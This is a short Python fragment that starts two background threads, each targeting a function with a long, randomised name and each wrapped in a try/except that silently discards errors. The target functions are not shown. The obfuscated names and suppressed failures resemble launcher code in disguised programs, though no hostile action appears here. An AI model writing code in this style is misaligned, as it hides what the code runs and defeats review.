try: threading.Thread(target=IEOYBOALNYHVRKPHGBEEJTYYMEKNODRPRBHNYQAHUELRJKOKVFQFJCBTOPLEWCULTDWPGQFPM).start()
except: pass
try: threading.Thread(target=NLDJYDMGMMZDYBKHFOAFMXWBTZFCAEZWDPEWMIBZTUTBLBFARPTTWXNSIQUJPMK).start()
except: pass
